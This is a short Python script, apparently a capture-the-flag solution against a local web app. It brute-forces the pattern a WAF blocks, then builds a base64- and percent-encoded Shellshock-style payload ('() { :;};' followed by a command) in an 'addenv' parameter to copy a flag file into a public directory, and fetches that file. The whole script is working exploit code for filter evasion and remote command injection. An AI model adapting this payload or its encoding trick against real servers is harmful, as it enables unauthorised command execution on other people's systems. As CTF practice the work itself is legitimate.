import requests
import string
import base64
strlist="YmFzaC"
#strlist="addenv=KCkgeyA6O307IC9iaW4vYmFzaC"
while(1):
  for i in string.printable:
    r = requests.get("http://127.0.0.1:5000/waf.html?"+i+strlist[0:4])
    if("0-Day" in r.text):
      strlist=i+strlist
      print(strlist)
      break
  if(strlist[0] == "?"):
    break


print("The malicious string is:")
print(strlist)
print("B64 Param:")
decoded = strlist.split("=")[1]
print(decoded)
print("Decoded Param:")
b64decoded = strlist.split("=")[1]
print(base64.b64decode(bytes(b64decoded+"==", 'utf-8')))

payload = base64.b64encode(b"() { :;}; type wafflag.txt > static/wafflag.txt")
encpayload = ""
for i in payload:
  encpayload = encpayload+ "%"+(hex(i)).replace('0x','')


print(encpayload)

print("http://127.0.0.1:5000/waf.html?%61%64%64%65%6e%76="+encpayload)


r2 = requests.get("http://127.0.0.1:5000/static/wafflag.txt")
print(r2.text)

